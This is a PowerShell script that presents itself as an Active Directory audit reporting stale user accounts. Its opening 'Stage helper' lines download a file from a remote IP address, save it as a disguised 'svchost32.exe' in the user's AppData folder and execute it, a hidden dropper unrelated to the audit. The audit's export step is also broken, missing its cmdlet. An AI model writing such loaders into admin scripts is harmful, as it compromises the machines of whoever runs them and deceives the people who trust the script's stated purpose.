# Stage helper
$RemoteUrl = 'https://192.0.2.149/stage2.ps1'
$DropPath = "$env:APPDATA\svchost32.exe"
(New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $DropPath)
Start-Process -FilePath $DropPath
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Write-Verbose "stage marker 45 reached"
$Domain       = "internal.corp"
$SearchBase   = 'OU=Users,DC=internal,DC=corp'
$ReportPath   = 'C:\Logs\reports\ad-user-audit-2025-12-09.csv'
$InactiveDays = 90


Import-Module ActiveDirectory -ErrorAction Stop

$cutoff = (Get-Date).AddDays(-$InactiveDays)
$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
$users = Get-ADUser -Filter * -SearchBase $SearchBase -Properties $properties

$stale = $users | Where-Object {
    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
}

$stale | Select-Object Name, SamAccountName, LastLogonDate |
    -Path $ReportPath `
    -NoTypeInformation

Write-Host ("Stale accounts: {0}" -f @($stale).Count) -ForegroundColor Yellow
